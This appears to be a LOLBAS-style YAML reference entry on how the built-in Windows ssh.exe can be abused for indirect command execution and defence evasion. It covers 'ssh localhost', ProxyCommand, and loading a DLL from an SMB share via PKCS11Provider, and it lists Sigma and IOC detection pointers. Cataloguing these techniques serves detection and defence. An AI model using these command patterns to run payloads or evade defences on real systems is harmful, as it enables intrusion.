      document_utf8: "---\nName: ssh.exe\nDescription: Ssh.exe is the OpenSSH compatible client can be\
        \ used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.\nAuthor:\
        \ Akshat Pradhan\nCreated: 2021-11-08\nCommands:\n  - Command: ssh localhost \"{CMD}\"\n    Description:\
        \ Executes specified command on host machine. The prompt for password can be eliminated by adding\
        \ the host's public key in the user's authorized_keys file. Adversaries can do the same for execution\
        \ on remote machines.\n    Usecase: Execute specified command, can be used for defense evasion.\n\
        \    Category: Execute\n    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows\
        \ 10 1809, Windows Server 2019\n    Tags:\n      - Execute: CMD\n  - Command: ssh -o ProxyCommand=\"\
        {CMD}\" .\n    Description: Executes specified command from ssh.exe\n    Usecase: Performs execution\
        \ of specified file, can be used as a defensive evasion.\n    Category: Execute\n    Privileges:\
        \ User\n    MitreID: T1202\n    OperatingSystem: Windows 10\n    Tags:\n      - Execute: CMD\n\
        \  - Command: ssh -o PKCS11Provider=\"\\\\\\\\127.0.0.1\\\\Temp\\\\example.dll\" win@github.com\n\
        \    Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload\
        \ executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature\
        \ termination by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\\` should\
        \ be turned into `\\\\`).\n    Usecase: Performs indirect execution of a specified DLL from a\
        \ remote share, can be used for defense evasion.\n    Category: Execute\n    Privileges: User\n\
        \    MitreID: T1202\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute:\
        \ DLL\n      - Execute: Remote\nFull_Path:\n  - Path: c:\\windows\\system32\\OpenSSH\\ssh.exe\n\
        Code_Sample:\n  - Code: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9\nDetection:\n\
        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml\n\
        \  - IOC: Event ID 4624 with process name C:\\Windows\\System32\\OpenSSH\\sshd.exe.\n  - IOC:\
        \ command line arguments specifying execution.\nResources:\n  - Link: https://gtfobins.github.io/gtfobins/ssh/\n\
